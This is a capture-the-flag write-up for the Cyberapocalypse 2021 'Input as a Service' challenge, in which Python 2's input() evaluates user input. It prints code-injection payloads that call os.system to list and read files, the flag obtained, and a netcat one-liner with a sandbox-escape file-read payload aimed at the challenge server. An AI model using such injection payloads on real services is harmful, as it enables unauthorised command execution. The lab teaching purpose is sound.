---
slug: input-as-a-service-cyberapocalypse-2021-ctf
title: Input as a Service - Cyberapocalypse 2021 CTF
description: This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.
authors: kiroki
tags: [Cyber Security, CTF]
---

This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.

### Prompt

In order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them.

<!-- truncate -->

### Recon

We can netcat to a service at some address given to us. Upon doing so, we are prompted by the question _"Do you sound like an alien?"_, followed by what looks like a python prompt

```
Do you sound like an alien?
>>>
```

If we supply it something random, it will spit out a python error trace.

```
Do you sound like an alien?
>>> lolwut


Traceback (most recent call last):
  File "input_as_a_service.py", line 16, in <module>
    main()
  File "input_as_a_service.py", line 12, in main
    text = input(' ')
  File "<string>", line 1, in <module>
NameError: name 'lolwut' is not defined
```

### Analysis

We see in the traceback, that we're supplying info to an `input` function inside of python2.x. This method has a well known vulnerability, which is that it tries to run the value of `input()` as code.

We can easily make use of that, and see if we can't invoke the `os` module of python, and maybe do some filesystem recon. We can do that by sending the following line into the input

```python
__import__("os").system("ls")
```

And we will see, that one of the files is indeed `flag.txt`.

### Solution

We can go as complicated as we like, but the most straightforward way to solve this particular challenge, is to invoke the `os` module of python, and try to run `cat` on the file we found `flag.txt`.

```python
[GCC 9.3.0]
Do you sound like an alien?
>>>

 __import__('os').system('cat flag.txt')
CHTB{4li3n5_us3_pyth0n2.X?!}
0
```

And so, we get the flag

```
CHTB{4li3n5_us3_pyth0n2.X?!}
```

I'll throw the following line here as well, for reference

```python
echo 'int(().__class__.__base__.__subclasses__()[40]("flag.txt","r").read())' | nc 188.166.145.178 31960 | grep -o CHTB{.*} --color=none
```